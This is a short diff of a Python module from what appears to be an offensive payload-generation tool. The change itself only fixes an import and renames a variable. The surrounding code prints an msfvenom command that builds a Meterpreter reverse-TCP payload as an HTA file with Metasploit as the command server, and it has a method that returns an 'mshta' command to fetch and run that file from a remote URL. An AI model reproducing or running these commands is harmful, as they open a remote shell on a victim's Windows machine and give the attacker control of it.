@@ -1,5 +1,5 @@
 # encoding: utf8
-from .config import *
+from config import *
 
 
 class Shell:
@@ -23,7 +23,7 @@ C2         -> Metasploit
 Language   -> powershell
 Platform   -> All
 GenPayload -> msfvenom -f hta-psh -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o m.hta
-""".format(lhost, port_msf)
+""".format(LHOST, port_msf)
 
     def reverse(self, url):
         return "mshta {0}".format(url)
